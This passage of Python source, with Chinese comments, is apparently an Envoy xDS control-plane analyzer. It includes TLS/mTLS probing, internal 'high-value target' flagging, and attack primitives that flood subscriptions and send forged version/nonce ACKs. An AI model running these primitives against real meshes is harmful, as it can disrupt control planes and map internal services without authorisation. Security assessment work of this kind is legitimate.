        """
        # 优先使用 gRPC；若不可用且 H2 可用，则切换 RawH2Transport 最小订阅
        if not (GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2):
            if H2_AVAILABLE:
                return await self._run_ads_raw_session(type_urls or [self.TYPE_URLS['LDS']], duration_sec=duration_sec)
            return {'status': 'SKIPPED', 'reason': 'neither grpc/proto nor hyper-h2 available'}

        type_urls = type_urls or [self.TYPE_URLS['LDS'], self.TYPE_URLS['CDS']]
        resource_names = resource_names or {}

        channel, target = await self.tls_mtls_setup(use_tls, ca_cert, client_cert, client_key, server_name)

        # 解析 ADS Stub
        if hasattr(ads_pb2_grpc, 'AggregatedDiscoveryServiceStub'):
            stub = ads_pb2_grpc.AggregatedDiscoveryServiceStub(channel)
        elif hasattr(ads_pb2_grpc, 'AggregatedDiscoveryServiceStub'):
            stub = ads_pb2_grpc.AggregatedDiscoveryServiceStub(channel)  # 兼容不同包命名
        else:
            await channel.close()
            return {'status': 'ERROR', 'error': 'ADS stub not found'}

        outq: asyncio.Queue = asyncio.Queue()
        versions: Dict[str, Dict[str, str]] = {}  # {type_url: {resource_name: version}}
        last_nonce: Dict[str, str] = {}
        events: List[Dict] = []
        start = time.time()

        # 初始订阅
        for tu in type_urls:
            await outq.put(self.serialize_discovery_request(tu, resource_names.get(tu, [])))

        async def req_iter():
            while True:
                item = await outq.get()
                yield item

        call = stub.StreamAggregatedResources(req_iter())

        try:
            async for resp in call:
                parsed = self.parse_discovery_response(resp)
                tu = parsed['type_url']
                last_nonce[tu] = parsed.get('nonce', '')
                # 记录事件
                self.record_push_events(events, parsed)
                # 跟踪版本
                self.track_resource_versions(versions, parsed)

                # ACK 当前响应
                ack = self.serialize_discovery_request(
                    tu,
                    resource_names.get(tu, []),
                    response_nonce=parsed.get('nonce', ''),
                    version_info=parsed.get('version_info', '')
                )
                await outq.put(ack)

                # 时长达到则退出
                if time.time() - start > duration_sec:
                    break
        except Exception as e:
            await channel.close()
            return {'status': 'ERROR', 'error': f'ADS stream error: {e}'}

        await channel.close()

        snapshot = self.emit_update_snapshot(versions, events)
        snapshot.update({
            'status': 'OK',
            'target': target,
            'delta_supported': await self.detect_delta_support(),
        })
        return snapshot

    def serialize_discovery_request(self,
                                    type_url: str,
                                    resource_names: Optional[List[str]] = None,
                                    response_nonce: str = '',
                                    version_info: str = '',
                                    node_id: str = 'xds-analyzer',
                                    node_cluster: str = 'analyzer') -> Any:
        """构造 DiscoveryRequest（protobuf 对象）。gRPC 不可用时抛错。"""
        if not discovery_pb2:
            raise RuntimeError('protobuf not available')
        node = {'id': node_id, 'cluster': node_cluster}
        return discovery_pb2.DiscoveryRequest(
            type_url=type_url,
            resource_names=resource_names or [],
            response_nonce=response_nonce,
            version_info=version_info,
            node=node,
        )

    def parse_discovery_response(self, resp: Any) -> Dict:
        """解析 DiscoveryResponse，尽可能提取信息与资源类型。"""
        result: Dict[str, Any] = {
            'type_url': getattr(resp, 'type_url', ''),
            'version_info': getattr(resp, 'version_info', ''),
            'nonce': getattr(resp, 'nonce', ''),
            'resources': [],
        }
        res_list = getattr(resp, 'resources', [])
        for anymsg in res_list:
            # 提取 Any 的 type_url 与大小；尝试 JSON 显示
            entry: Dict[str, Any] = {'type_url': getattr(anymsg, 'type_url', ''), 'size': len(getattr(anymsg, 'value', b''))}
            try:
                if 'google.protobuf.any' in str(type(anymsg)).lower():
                    # best-effort JSON（需要具体消息类型才能 unpack，这里仅做原始 dump）
                    entry['raw'] = {'type_url': anymsg.type_url, 'len': len(anymsg.value)}
            except Exception:
                pass
            result['resources'].append(entry)
        # 粗略提取配置类型
        result['config_types'] = self.extract_config_types_from_resources(result['resources'])
        # 尝试识别 Wasm 痕迹
        result['wasm_detected'] = any('wasm' in json.dumps(r).lower() for r in result['resources'])
        # 生成拓扑图（best-effort）并触发事件
        try:
            topo = self._build_topology_graph_from_resources(result['resources'])
            result['topology'] = topo
            # 事件：高价值目标（例如指向内网的 Cluster）
            for node_id, node in topo.get('nodes', {}).items():
                if node.get('type') == 'Cluster':
                    # 简单判定：内网网段或无TLS标记
                    addr = node.get('address', '')
                    if any(addr.startswith(p) for p in ('10.', '192.168.', '172.')):
                        self.emit_event('HighValueTargetDiscovered', {'type': 'Cluster', 'name': node.get('name', node_id), 'address': addr})
            if any(n.get('wasm', False) for n in topo.get('nodes', {}).values()):
                self.emit_event('WasmPluginDiscovered', {'plugins': True})
        except Exception:
            pass
        return result

    def extract_config_types_from_resources(self, resources: List[Dict]) -> List[str]:
        types = set()
        for r in resources:
            tu = r.get('type_url', '')
            for k, v in self.TYPE_URLS.items():
                if v == tu:
                    types.add(k)
        return sorted(list(types))

    def extract_wasm_from_resources(self, resources: List[Dict]) -> List[Dict]:
        """从资源中抽取 Wasm 相关线索（best-effort）。"""
        hits = []
        for r in resources:
            if 'wasm' in json.dumps(r).lower():
                hits.append(r)
        return hits

    # ------------------- 拓扑图与动态Proto解析（新增） -------------------
    def _build_topology_graph_from_resources(self, resources: List[Dict]) -> Dict:
        """根据资源（Any 元信息/原始片段）构建轻量拓扑图。"""
        graph = {'nodes': {}, 'edges': []}
        try:
            for i, r in enumerate(resources):
                tu = r.get('type_url', '')
                node_id = f"res_{i}"
                node = {'id': node_id, 'type': None, 'name': None}
                if tu.endswith('Listener'):
                    node['type'] = 'Listener'
                elif tu.endswith('Cluster'):
                    node['type'] = 'Cluster'
                elif tu.endswith('RouteConfiguration'):
                    node['type'] = 'RouteConfiguration'
                elif tu.endswith('ClusterLoadAssignment'):
                    node['type'] = 'Endpoint'
                # 尝试从 raw 中解析出部分字段（动态 Protobuf 解析）
                raw = r.get('raw') or {}
                val_len = raw.get('len', 0)
                node['raw_len'] = val_len
                # 标注 wasm
                if 'wasm' in json.dumps(raw).lower():
                    node['wasm'] = True
                graph['nodes'][node_id] = node
            return graph
        except Exception:
            return graph

    def dynamic_protobuf_parse(self, data: bytes, depth: int = 0) -> Any:
        """简化的动态Protobuf解析器：仅基于wire type解析为嵌套结构。
        注意：不依赖 .proto，字段号仅保留为数字键。
        """
        idx = 0
        out: Dict[str, Any] = {}
        try:
            while idx < len(data):
                # 读取 key (varint)
                k, n = self._read_varint(data, idx)
                idx += n
                field_no = k >> 3
                wire = k & 0x7
                if wire == 0:  # varint
                    v, n2 = self._read_varint(data, idx)
                    idx += n2
                    out.setdefault(str(field_no), []).append(v)
                elif wire == 1:  # 64-bit
                    out.setdefault(str(field_no), []).append(int.from_bytes(data[idx:idx+8], 'little'))
                    idx += 8
                elif wire == 2:  # length-delimited
                    ln, n2 = self._read_varint(data, idx)
                    idx += n2
                    chunk = data[idx:idx+ln]
                    idx += ln
                    # 尝试utf-8
                    try:
                        s = chunk.decode('utf-8')
                        out.setdefault(str(field_no), []).append(s)
                    except Exception:
                        # 尝试递归解析
                        if depth < 3 and len(chunk) > 0:
                            out.setdefault(str(field_no), []).append(self.dynamic_protobuf_parse(chunk, depth+1))
                        else:
                            out.setdefault(str(field_no), []).append({'bytes': len(chunk)})
                elif wire == 5:  # 32-bit
                    out.setdefault(str(field_no), []).append(int.from_bytes(data[idx:idx+4], 'little'))
                    idx += 4
                else:
                    # 未知wire，跳过
                    break
            return out
        except Exception:
            return out

    def _read_varint(self, data: bytes, idx: int) -> Tuple[int, int]:
        shift = 0
        res = 0
        start = idx
        while True:
            b = data[idx]
            res |= (b & 0x7F) << shift
            idx += 1
            if not (b & 0x80):
                break
            shift += 7
        return res, (idx - start)

    # ------------------- 攻击原语（新增） -------------------
    async def execute_subscription_storm(self, type_url: Optional[str] = None, count: int = 50) -> Dict:
        """资源订阅风暴：快速发送多次不同 resource_names 的订阅请求（支持 gRPC 与 RawH2）。"""
        tu = type_url or self.TYPE_URLS['LDS']
        # gRPC 路径
        if GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2:
            try:
                channel, target = await self.tls_mtls_setup(use_tls=False)
                stub = ads_pb2_grpc.AggregatedDiscoveryServiceStub(channel)
                outq: asyncio.Queue = asyncio.Queue()
                for i in range(count):
                    names = [f"res-{i}"] if (i % 3 == 0) else []
                    await outq.put(self.serialize_discovery_request(tu, names))
                async def req_iter():
                    while not outq.empty():
                        yield await outq.get()
                call = stub.StreamAggregatedResources(req_iter())
                got = 0
                async for _ in call:
                    got += 1
                    if got >= 3:
                        break
                await channel.close()
                return {'status': 'OK', 'sent': count, 'received': got, 'mode': 'grpc'}
            except Exception as e:
                return {'status': 'ERROR', 'error': str(e)}
        # RawH2 路径
        if H2_AVAILABLE:
            try:
                port = next((p for p in self.xds_ports if await self._port_open(p)), self.target_port)
                sess = RawH2AdsSession(self.target_host, port, timeout=self.timeout)
                await sess.open()
                for i in range(count):
                    names = [f"res-{i}"] if (i % 3 == 0) else []
                    await sess.send_request(tu, resource_names=names)
                # 读少量响应
                msgs = await sess.recv_messages(timeout=2.0)
                await sess.close()
                return {'status': 'OK', 'sent': count, 'received': len(msgs), 'mode': 'rawh2'}
            except Exception as e:
                return {'status': 'ERROR', 'error': str(e)}
        return {'status': 'SKIPPED', 'reason': 'no grpc/proto nor hyper-h2'}

    async def execute_version_churn(self, type_url: Optional[str] = None, rounds: int = 10) -> Dict:
        """配置版本抖动：发送带错误 version_info/nonce 的 ACK/NACK 探测控制面健壮性（支持 gRPC 与 RawH2）。"""
        tu = type_url or self.TYPE_URLS['LDS']
        # gRPC 路径
        if GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2:
            try:
                channel, target = await self.tls_mtls_setup(use_tls=False)
                stub = ads_pb2_grpc.AggregatedDiscoveryServiceStub(channel)
                outq: asyncio.Queue = asyncio.Queue()
                # 初始订阅
                await outq.put(self.serialize_discovery_request(tu, []))
                async def req_iter():
                    while True:
                        try:
                            item = await asyncio.wait_for(outq.get(), timeout=2.0)
                            yield item
                        except asyncio.TimeoutError:
                            break
                call = stub.StreamAggregatedResources(req_iter())
                async for resp in call:
                    # 故意构造错误ACK
                    bad_v = f"v{random.randint(1000,9999)}"
                    bad_n = hashlib.sha1(str(time.time()).encode()).hexdigest()[:8]
                    await outq.put(self.serialize_discovery_request(tu, [], response_nonce=bad_n, version_info=bad_v))
                    rounds -= 1
                    if rounds <= 0:
                        break
                await channel.close()
                return {'status': 'OK', 'rounds': rounds, 'mode': 'grpc'}
            except Exception as e:
                return {'status': 'ERROR', 'error': str(e)}
        # RawH2 路径
        if H2_AVAILABLE:
            try:
                port = next((p for p in self.xds_ports if await self._port_open(p)), self.target_port)
                sess = RawH2AdsSession(self.target_host, port, timeout=self.timeout)
                await sess.open()
                await sess.send_request(tu, resource_names=[])
                # 收到一条后开始抖动
                start = time.time()
                while rounds > 0 and time.time() - start < 5.0:
                    # 伪造 version/nonce
                    bad_v = f"v{random.randint(1000,9999)}"
                    bad_n = hashlib.sha1(str(time.time()).encode()).hexdigest()[:8]
                    await sess.send_request(tu, resource_names=[], version_info=bad_v, response_nonce=bad_n)
                    rounds -= 1
                await sess.close()
                return {'status': 'OK', 'rounds': rounds, 'mode': 'rawh2'}
            except Exception as e:
                return {'status': 'ERROR', 'error': str(e)}
        return {'status': 'SKIPPED', 'reason': 'no grpc/proto nor hyper-h2'}

    def record_push_events(self, events: List[Dict], parsed_resp: Dict) -> None:
        events.append({
            'time': time.time(),
            'type_url': parsed_resp.get('type_url'),
            'version': parsed_resp.get('version_info'),
            'count': len(parsed_resp.get('resources', [])),
        })

    def track_resource_versions(self, versions: Dict[str, Dict[str, str]], parsed_resp: Dict) -> None:
        tu = parsed_resp.get('type_url', '')
        if not tu:
            return
        versions.setdefault(tu, {})
        # 无法解析单个 resource name 时，记录聚合版本
        versions[tu]['__version__'] = parsed_resp.get('version_info', '')

    def emit_update_snapshot(self, versions: Dict[str, Dict[str, str]], events: List[Dict]) -> Dict:
        return {
            'versions': versions,
            'events': events,
            'types': list(versions.keys()),
            'message_count': len(events),
        }

    async def detect_delta_support(self) -> bool:
        """基于 admin /stats 的证据判断是否支持 delta-xDS。"""
        try:
            return await self._test_incremental_updates()
        except Exception:
            return False

    # ------------------- TLS/mTLS 验证与需求探测（新增） -------------------
    async def tls_requirements_probe(self,
                                     ca_cert: Optional[bytes | str] = None,
                                     client_cert: Optional[bytes | str] = None,
                                     client_key: Optional[bytes | str] = None,
                                     server_name: Optional[str] = None,
                                     duration_sec: float = 1.5) -> Dict:
        """探测 ADS 的传输层要求：是否允许明文/需要 TLS/需要 mTLS。
        返回 {'allows_insecure', 'tls_ok', 'mtls_ok', 'classification', 'errors': {...}}
        """
        result = {'allows_insecure': False, 'tls_ok': False, 'mtls_ok': False, 'classification': 'unknown', 'errors': {}}
        # 0) 端口可用性
        if not await self._port_open(self.target_port):
            # 尝试其他发现端口
            hint = await self.discover_xds_endpoints()
            ports = hint.get('ports_open') or [self.target_port]
            if ports:
                self.target_port = ports[0]
        # 1) 明文
        try:
            sess = await self.connect_ads_stream(type_urls=[self.TYPE_URLS['LDS']], use_tls=False, duration_sec=duration_sec)
            result['allows_insecure'] = (sess.get('status') == 'OK')
        except Exception as e:
            result['errors']['insecure'] = str(e)
        # 2) TLS（仅 CA）
        try:
            sess = await self.connect_ads_stream(type_urls=[self.TYPE_URLS['LDS']], use_tls=True, ca_cert=ca_cert, server_name=server_name, duration_sec=duration_sec)
            result['tls_ok'] = (sess.get('status') == 'OK')
        except Exception as e:
            result['errors']['tls'] = str(e)
        # 3) mTLS（带客户端证书）
        try:
            if client_cert and client_key:
                sess = await self.connect_ads_stream(type_urls=[self.TYPE_URLS['LDS']], use_tls=True, ca_cert=ca_cert, client_cert=client_cert, client_key=client_key, server_name=server_name, duration_sec=duration_sec)
                result['mtls_ok'] = (sess.get('status') == 'OK')
        except Exception as e:
            result['errors']['mtls'] = str(e)
        # 分类
        if result['mtls_ok'] and not result['tls_ok']:
            result['classification'] = 'requires_mtls'
        elif result['tls_ok'] and not result['allows_insecure']:
            result['classification'] = 'requires_tls'
        elif result['tls_ok'] and result['allows_insecure']:
            result['classification'] = 'tls_optional_insecure_allowed'
        elif result['allows_insecure']:
            result['classification'] = 'insecure_only_or_tls_failed'
        else:
            result['classification'] = 'unreachable_or_auth_required'
        return result

    async def validate_ads_tls_session(self,
                                       use_tls: bool = True,
                                       ca_cert: Optional[bytes | str] = None,
                                       client_cert: Optional[bytes | str] = None,
                                       client_key: Optional[bytes | str] = None,
                                       server_name: Optional[str] = None,
                                       duration_sec: float = 3.0) -> Dict:
        """执行一次 TLS/mTLS ADS 会话验证：
        - 进行短时 ADS 订阅并 ACK
        - 并行获取 TLS 握手/证书信息（独立 TLS 探针）
        返回 {'session': {...}, 'tls_probe': {...}}
        """
        session = await self.connect_ads_stream(type_urls=[self.TYPE_URLS['LDS']], use_tls=use_tls, ca_cert=ca_cert, client_cert=client_cert, client_key=client_key, server_name=server_name, duration_sec=duration_sec)
        tls_info = await self._probe_tls_handshake(self.target_port, server_name or self.target_host, ca_cert, client_cert, client_key)
        return {'session': session, 'tls_probe': tls_info}

    async def _probe_tls_handshake(self, port: int, server_name: str,
                                   ca_cert: Optional[bytes | str],
                                   client_cert: Optional[bytes | str],
                                   client_key: Optional[bytes | str]) -> Dict:
        """原生 TLS 握手探针，获取 ALPN/TLS 版本/证书Subject/Issuer/SAN。"""
        info = {'ok': False}
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            # 如果提供了 CA，则加载
            def _maybe_load(ctx: ssl.SSLContext, ca, cert, key):
                try:
                    if ca:
                        if isinstance(ca, (bytes, bytearray)):
                            ca_file = None
                            ctx.load_verify_locations(cadata=ca.decode() if isinstance(ca, (bytes, bytearray)) else str(ca))
                        else:
                            ctx.load_verify_locations(cafile=str(ca))
                        ctx.verify_mode = ssl.CERT_REQUIRED
                    if cert and key:
                        if isinstance(cert, (bytes, bytearray)) or isinstance(key, (bytes, bytearray)):
                            # 临时文件路径方案可实现，此处简化：若为 bytes 则不加载（gRPC 已使用）；
                            pass
                        else:
                            ctx.load_cert_chain(certfile=str(cert), keyfile=str(key))
                except Exception:
                    pass
            _maybe_load(ctx, ca_cert, client_cert, client_key)
            ctx.set_alpn_protocols(['h2', 'http/1.1'])
            reader, writer = await asyncio.open_connection(self.target_host, port, ssl=ctx, server_hostname=server_name)
            sslobj = writer.get_extra_info('ssl_object')
            if sslobj:
                info['alpn'] = sslobj.selected_alpn_protocol()
                info['tls_version'] = sslobj.version()
                info['cipher'] = sslobj.cipher()
                try:
                    peercert = sslobj.getpeercert()
                    info['peer_subject'] = peercert.get('subject')
                    info['peer_issuer'] = peercert.get('issuer')
                    info['sans'] = [v[0][1] for v in peercert.get('subjectAltName', [])] if 'subjectAltName' in peercert else []
                except Exception:
                    pass
            writer.close(); await writer.wait_closed()
            info['ok'] = True
        except Exception as e:
            info['error'] = str(e)
        return info

    # ------------------- 发现与寻址（新增） -------------------
    async def discover_xds_endpoints(self) -> Dict:
        """多策略发现 xDS 端点：DNS A/AAAA、常用端口探测、SNI 猜测。"""
        results = {'targets': [], 'ports_open': []}
        try:
            addrs = socket.getaddrinfo(self.target_host, None, proto=socket.IPPROTO_TCP)
            v4 = [a[4][0] for a in addrs if a[0] == socket.AF_INET]
            v6 = [a[4][0] for a in addrs if a[0] == socket.AF_INET6]
            results['targets'] = sorted(set(v4 + v6))
        except Exception:
            pass
        open_ports = []
        for p in self.xds_ports:
            if await self._port_open(p):
                open_ports.append(p)
        results['ports_open'] = open_ports
        results['sni_guess'] = self.tls_sni_guess()
        return results

    def tls_sni_guess(self) -> str:
        host = self.target_host
        if host.count('.') >= 1:
            return host
        return host

    async def dns_srv_lookup(self, name: str) -> List[str]:
        """SRV 查询（需要 dnspython 时可加强）。此处占位为返回空。"""
        return []

    async def aaaa_lookup(self, hostname: str) -> List[str]:
        try:
            addrs = socket.getaddrinfo(hostname, None, socket.AF_INET6)
            return list({a[4][0] for a in addrs})
        except Exception:
            return []

    # ------------------- Admin/配置解析与鉴权（增强） -------------------
    def parse_config_dump(self, http_response_text: str) -> Dict:
        """从 /config_dump HTTP 响应提取 JSON 并结构化。"""
        try:
            body_start = http_response_text.find('\r\n\r\n')
            body = http_response_text[body_start+4:] if body_start != -1 else http_response_text
            # 定位第一个 JSON 起始符
            jstart = min([p for p in [body.find('{'), body.find('[')] if p != -1], default=-1)
            if jstart > 0:
                body = body[jstart:]
            data = json.loads(body)
        except Exception:
            return {'ok': False, 'error': 'invalid json'}

        structured = {'ok': True, 'raw': data, 'types': []}
        text = json.dumps(data).lower()
        for k, tu in self.TYPE_URLS.items():
            if k != 'WASM' and (k.lower() in text or tu.lower() in text):
                structured['types'].append(k)
        if 'envoy.filters.http.wasm' in text or 'wasm' in text:
            structured['types'].append('WASM_PLUGINS')
        return structured

    # ------------------- HTTP/2 低层握手（新增） -------------------
    async def h2_client_handshake(self, port: Optional[int] = None) -> Dict:
        """执行最小 H2 客户端握手（不依赖外部库）。"""
        port = port or self.target_port
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(self.target_host, port), timeout=self.timeout)
            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            writer.write(self._build_http2_settings_frame())
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(2048), timeout=3.0)
            frames = self._analyze_http2_frames(resp)
            writer.close(); await writer.wait_closed()
            return {'ok': True, 'frames': frames, 'len': len(resp)}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    async def open_grpc_stream(self):
        """低层打开 gRPC 流（需要完整 H2/HPACK 实现，暂不提供）。"""
        raise NotImplementedError('Use connect_ads_stream via grpc.aio instead')

    def grpc_frame_encode(self, payload: bytes) -> bytes:
        """封装 gRPC 数据帧（0|length|payload）。"""
        return b"\x00" + len(payload).to_bytes(4, 'big') + payload

    def grpc_frame_decode(self, frame: bytes) -> bytes:
        """解析 gRPC 数据帧，返回 payload。"""
        if not frame or len(frame) < 5:
            return b''
        return frame[5:]

# ------------------- RawH2Transport 实现（基于 hyper-h2） -------------------
class RawH2Transport:
    def __init__(self, host: str, port: int, timeout: float = 5.0, use_tls: bool = True, server_name: Optional[str] = None):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.use_tls = use_tls
        self.server_name = server_name or host

class RawH2AdsSession:
    def __init__(self, host: str, port: int, timeout: float = 5.0, use_tls: bool = True, server_name: Optional[str] = None):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.use_tls = use_tls
        self.server_name = server_name or host
        self.reader: Optional[asyncio.StreamReader] = None
        self.writer: Optional[asyncio.StreamWriter] = None
        self.conn: Optional['h2.connection.H2Connection'] = None
        self.stream_id: Optional[int] = None
        self.helper = RawH2Transport(host, port, timeout, use_tls, server_name)
        self._buffer = bytearray()

    async def open(self):
        if self.use_tls:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2'])
            self.reader, self.writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port, ssl=ctx, server_hostname=self.server_name),
                timeout=self.timeout
            )
        else:
            self.reader, self.writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port), timeout=self.timeout
            )
        self.conn = h2.connection.H2Connection()
        self.conn.initiate_connection()
        self.writer.write(self.conn.data_to_send()); await self.writer.drain()
        self.stream_id = self.conn.get_next_available_stream_id()
        path = '/envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources'
        self.conn.send_headers(self.stream_id, self._headers(path))
        self.writer.write(self.conn.data_to_send()); await self.writer.drain()

    async def send_request(self, type_url: str, resource_names: Optional[List[str]] = None,
                           version_info: Optional[str] = None, response_nonce: Optional[str] = None,
                           node_id: str = 'xds-analyzer', node_cluster: str = 'analyzer'):
        payload = self._build_discovery_request(type_url, resource_names or [], node_id, node_cluster,
                                                version_info=version_info, response_nonce=response_nonce)
        frame = self._encode_grpc_message(payload)
        self.conn.send_data(self.stream_id, frame)
        self.writer.write(self.conn.data_to_send()); await self.writer.drain()

    async def recv_messages(self, timeout: float = 2.0) -> List[bytes]:
        if not self.reader or not self.conn:
            return []
        end = time.time() + timeout
        msgs: List[bytes] = []
        while time.time() < end:
            try:
                chunk = await asyncio.wait_for(self.reader.read(8192), timeout=timeout)
            except asyncio.TimeoutError:
                break
            if not chunk:
                break
            events = self.conn.receive_data(chunk)
            for ev in events:
                if isinstance(ev, h2.events.DataReceived) and ev.stream_id == self.stream_id:
                    self._buffer.extend(ev.data)
                    self.conn.acknowledge_received_data(len(ev.data), self.stream_id)
            self.writer.write(self.conn.data_to_send()); await self.writer.drain()
        # Decode any accumulated frames
        msgs = self._decode_grpc_messages(bytes(self._buffer))
        self._buffer.clear()
        return msgs

    async def ack(self, type_url: str, version_info: str, response_nonce: str):
        await self.send_request(type_url, resource_names=[], version_info=version_info, response_nonce=response_nonce)

    def parse_discovery_response(self, payload: bytes) -> Dict:
        return self._parse_discovery_response_raw(payload)

    async def close(self):
        try:
            if self.writer:
                self.writer.close(); await self.writer.wait_closed()
        except Exception:
            pass

    async def _open(self) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter, 'h2.connection.H2Connection']:
        if self.use_tls:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2'])
            reader, writer = await asyncio.wait_for(asyncio.open_connection(self.host, self.port, ssl=ctx, server_hostname=self.server_name), timeout=self.timeout)
        else:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(self.host, self.port), timeout=self.timeout)
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        writer.write(conn.data_to_send())
        await writer.drain()
        return reader, writer, conn

    def _headers(self, path: str) -> List[Tuple[str, str]]:
        return [
            (':method', 'POST'),
            (':authority', f'{self.host}:{self.port}'),
            (':scheme', 'https' if self.use_tls else 'http'),
            (':path', path),
            ('content-type', 'application/grpc'),
            ('te', 'trailers'),
            ('user-agent', 'xds-rawh2/1.0'),
        ]

    def _pb_varint(self, n: int) -> bytes:
        out = bytearray()
        while True:
            to_write = n & 0x7F
            n >>= 7
            if n:
                out.append(to_write | 0x80)
            else:
                out.append(to_write)
                break
        return bytes(out)

    def _pb_key(self, field_no: int, wire_type: int) -> bytes:
        return self._pb_varint((field_no << 3) | wire_type)

    def _pb_string(self, field_no: int, s: str) -> bytes:
        b = s.encode('utf-8')
        return self._pb_key(field_no, 2) + self._pb_varint(len(b)) + b

    def _pb_bytes(self, field_no: int, b: bytes) -> bytes:
        return self._pb_key(field_no, 2) + self._pb_varint(len(b)) + b

    def _build_node(self, node_id: str, node_cluster: str) -> bytes:
        # Node{id=1, cluster=2}
        msg = self._pb_string(1, node_id) + self._pb_string(2, node_cluster)
        return msg

    def _build_discovery_request(self, type_url: str, resource_names: Optional[List[str]], node_id: str, node_cluster: str,
                                  version_info: Optional[str] = None, response_nonce: Optional[str] = None) -> bytes:
        # DiscoveryRequest: version_info(1), node(2), resource_names(3), type_url(4), response_nonce(5)
        body = b''
        if version_info:
            body += self._pb_string(1, version_info)
        body += self._pb_string(4, type_url)
        if resource_names:
            for name in resource_names:
                body += self._pb_string(3, name)
        node_msg = self._build_node(node_id, node_cluster)
        body += self._pb_bytes(2, node_msg)
        if response_nonce:
            body += self._pb_string(5, response_nonce)
        return body

    def _encode_grpc_message(self, payload: bytes) -> bytes:
        # 0 + length(4 bytes BE) + payload
        return b'\x00' + len(payload).to_bytes(4, 'big') + payload

    def _decode_grpc_messages(self, data: bytes) -> List[bytes]:
        msgs = []
        idx = 0
        while idx + 5 <= len(data):
            flag = data[idx]
            ln = int.from_bytes(data[idx+1:idx+5], 'big')
            idx += 5
            if idx + ln > len(data):
                break
            msgs.append(data[idx:idx+ln])
            idx += ln
        return msgs

    async def send_ads_discovery_request(self, type_url: str, resource_names: Optional[List[str]] = None,
                                         node_id: str = 'xds-analyzer', node_cluster: str = 'analyzer',
                                         duration_sec: float = 3.0,
                                         version_info: Optional[str] = None,
                                         response_nonce: Optional[str] = None) -> Dict:
        if not H2_AVAILABLE:
            return {'status': 'SKIPPED', 'reason': 'hyper-h2 not available'}
        path = '/envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources'
        reader, writer, conn = await self._open()
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, self._headers(path))
        # Build one DiscoveryRequest
        dr = self._build_discovery_request(type_url, resource_names or [], node_id, node_cluster,
                                           version_info=version_info, response_nonce=response_nonce)
        conn.send_data(stream_id, self._encode_grpc_message(dr))
        writer.write(conn.data_to_send())
        await writer.drain()

        received_data = bytearray()
        trailers = {}
        start = time.time()
        try:
            while True:
                chunk = await asyncio.wait_for(reader.read(8192), timeout=self.timeout)
                if not chunk:
                    break
                events = conn.receive_data(chunk)
                for ev in events:
                    if isinstance(ev, h2.events.ResponseReceived) and ev.stream_id == stream_id:
                        pass
                    if isinstance(ev, h2.events.DataReceived) and ev.stream_id == stream_id:
                        received_data.extend(ev.data)
                        conn.acknowledge_received_data(len(ev.data), stream_id)
                    if isinstance(ev, h2.events.TrailersReceived) and ev.stream_id == stream_id:
                        trailers = dict(ev.headers)
                    if isinstance(ev, h2.events.StreamEnded) and ev.stream_id == stream_id:
                        break
                writer.write(conn.data_to_send())
                await writer.drain()
                if time.time() - start > duration_sec:
                    break
        except Exception:
            pass
        try:
            writer.close(); await writer.wait_closed()
        except Exception:
            pass
        # Parse gRPC-framed messages
        messages = self._decode_grpc_messages(bytes(received_data))
        parsed = [self._parse_discovery_response_raw(m) for m in messages]
        return {
            'status': 'OK' if messages else 'EMPTY',
            'messages': len(messages),
            'trailers': trailers,
            'parsed': parsed[:2]
        }

    def _parse_discovery_response_raw(self, payload: bytes) -> Dict:
        # DiscoveryResponse: version_info(1), resources(2 repeated Any), type_url(4), nonce(5)
        try:
            tree = XDSProtocolAnalyzer.dynamic_protobuf_parse(self, payload)
            # best-effort extract
            version = None
            type_url = None
            resources = []
            if '1' in tree and isinstance(tree['1'], list):
                # version_info as string
                for v in tree['1']:
                    if isinstance(v, str):
                        version = v; break
            if '4' in tree and isinstance(tree['4'], list):
                for v in tree['4']:
                    if isinstance(v, str):
                        type_url = v; break
            if '2' in tree and isinstance(tree['2'], list):
                for anymsg in tree['2']:
                    # Any: type_url(1), value(2)
                    a_tu = None; a_len = None
                    if isinstance(anymsg, dict):
                        if '1' in anymsg:
                            for v in anymsg['1']:
                                if isinstance(v, str):
                                    a_tu = v; break
                        if '2' in anymsg:
                            # 如果解析为 bytes长度标记
                            val = anymsg['2'][0]
                            if isinstance(val, dict) and 'bytes' in val:
                                a_len = val['bytes']
                    resources.append({'type_url': a_tu, 'value_len': a_len})
            return {'type_url': type_url, 'version_info': version, 'resources': resources}
        except Exception as e:
            return {'error': str(e)}

    # ------------------- ADS gRPC (best-effort minimal) -------------------
    async def _run_ads_best_effort(self) -> Dict:
        """最小可用 ADS 会话：连通性验证 + 单次订阅 + ACK 循环（尽力而为）"""
        result: Dict[str, Any] = {'status': 'SKIPPED'}
        if not (GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2):
            result['reason'] = 'missing grpc/proto'
            return result

        # Choose a candidate port
        port = next((p for p in self.xds_ports if await self._port_open(p)), None)
        if port is None:
            return {'status': 'UNAVAILABLE', 'reason': 'no xDS port open'}

        target = f"{self.target_host}:{port}"
        # Insecure channel by default; user can extend to TLS/mTLS
        try:
            channel = grpc_aio.insecure_channel(target, options=[('grpc.max_receive_message_length', 32 * 1024 * 1024)])
        except Exception as e:
            return {'status': 'ERROR', 'error': f'channel: {e}'}

        stub = None
        try:
            # Try both ADS stubs naming patterns
            for attr in ['AggregatedDiscoveryServiceStub', 'AggregatedDiscoveryServiceStub']:
